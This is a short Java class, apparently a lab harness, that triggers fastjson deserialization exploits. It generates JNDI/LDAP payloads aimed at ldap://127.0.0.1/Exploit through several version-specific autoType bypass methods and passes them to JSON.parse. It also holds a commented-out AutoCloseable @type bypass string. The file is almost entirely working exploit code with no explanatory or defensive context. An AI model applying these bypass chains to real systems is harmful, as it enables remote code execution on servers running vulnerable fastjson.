package org.example;

import com.alibaba.fastjson.*;
import com.alibaba.fastjson.parser.ParserConfig;
import org.springframework.context.annotation.ClassPathScanningCandidateComponentProvider;

public class App
{
    public static void main( String[] args )
    {

        //String payload =Payload.jdbc("ldap://127.0.0.1/Exploit");
        //String payload =Payload.jdbc_bypass25("ldap://127.0.0.1/Exploit");
        //String payload =Payload.jdbc_bypass42("ldap://127.0.0.1/Exploit");

        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload =Payload.jdbc_bypass68("ldap://127.0.0.1/Exploit");
        JSON.parse(payload);


        /*
        String s = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.example.User\",\"asdf\":123, \"name\":\"lala\", \"age\": 13, \"prop\":{\"k\":1}}";

        User u2 = (User)JSON.parse(s);
        System.out.println(u2);
         */

    }
}
